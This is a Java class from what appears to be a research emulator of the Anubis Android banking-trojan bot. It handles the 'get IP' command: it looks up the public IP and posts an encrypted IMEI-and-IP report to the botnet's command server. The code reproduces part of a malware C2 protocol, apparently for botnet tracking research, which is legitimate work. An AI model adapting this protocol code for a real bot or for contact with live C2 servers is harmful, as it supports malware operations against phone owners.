/*
 * Copyright (C) 2020 Max 'Libra' Kersten [@Libranalysis, https://maxkersten.nl]
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package anubis.commands;

import bot.network.Connector;
import anubis.bot.AnubisBot;

/**
 * This class handles the command to get the IP from the bot. NOTE THAT THIS
 * WILL UPLOAD YOUR ACTUAL IP IF YOU ARE NOT USING A PROXY SERVER!
 *
 * @author Max 'Libra' Kersten [@Libranalysis, https://maxkersten.nl]
 */
public class GetIp {

    /**
     * This class handles the command to get the IP from the bot. NOTE THAT THIS
     * WILL UPLOAD YOUR ACTUAL IP IF YOU ARE NOT USING A PROXY SERVER!
     *
     * @param bot the bot
     * @throws Exception if a HTTP request fails
     */
    public GetIp(AnubisBot bot) throws Exception {
        String log = "Received command to send IP to the server";
        bot.addLog(log);

        String result = bot.getConnector().post("http://en.utrace.de", ""); //No parameters for the request.

        Connector connector = bot.getConnector();
        String url = bot.getServer() + "/" + bot.getServerFolder() + "/a6.php";
        String ip = bot.getEncryptionHandler().untag(result, ">The IP address ", " is located in the");
        String parameters = "p=" + bot.getEncryptionHandler().encrypt(bot.getPhone().getImei() + "|IP bots: " + ip + "\n" + "|");
        connector.post(url, parameters);

        log = "Responded to the server with IP: " + ip;
        bot.addLog(log);
    }
}
